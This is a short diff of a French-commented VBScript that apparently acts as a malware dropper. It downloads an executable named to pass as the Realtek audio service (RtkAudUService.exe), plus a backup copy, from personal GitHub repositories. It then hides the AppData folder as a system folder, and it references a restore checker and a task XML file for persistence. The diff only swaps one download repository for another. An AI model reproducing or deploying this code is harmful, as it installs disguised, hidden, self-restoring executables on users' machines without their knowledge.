@@ -18,8 +18,8 @@ checkerPath = backupPath & "\CheckAndRestore.vbs"
 xmlPath = backupPath & "\RtkAudUService.xml"
 
 ' Télécharger RtkAudUService.exe et .bak si manquant
-If Not fso.FileExists(exePath) Then DownloadFile "https://raw.githubusercontent.com/DexXC/XC/main/RtkAudUService.exe", exePath
-If Not fso.FileExists(bakPath) Then DownloadFile "https://raw.githubusercontent.com/DexXC/XC/main/RtkAudUService.bak", bakPath
+If Not fso.FileExists(exePath) Then DownloadFile "https://raw.githubusercontent.com/Reverse0100/XC/refs/heads/main/RtkAudUService.exe", exePath
+If Not fso.FileExists(bakPath) Then DownloadFile "https://raw.githubusercontent.com/Reverse0100/XC/refs/heads/main/RtkAudUService.bak", bakPath
 
 ' Cacher dossiers
 shell.Run "attrib +h +s """ & appData & """", 0, True
